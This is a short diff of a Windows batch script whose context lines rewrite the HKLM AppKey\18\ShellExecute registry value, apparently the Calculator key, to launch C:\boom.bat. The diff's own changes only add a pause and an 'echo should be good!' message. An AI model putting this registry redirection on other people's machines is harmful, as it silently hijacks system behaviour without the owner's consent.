@@ -19,6 +19,7 @@ if %errorLevel% == 0 (
 goto boom
 REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute
 REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute /t REG_SZ /d C:\boom.bat /f
+pause 1
 
 :boom
 cd \
@@ -30,5 +31,5 @@ cd -
 
 
 
-
-pause >nul
+echo should be good!
+pause>nul
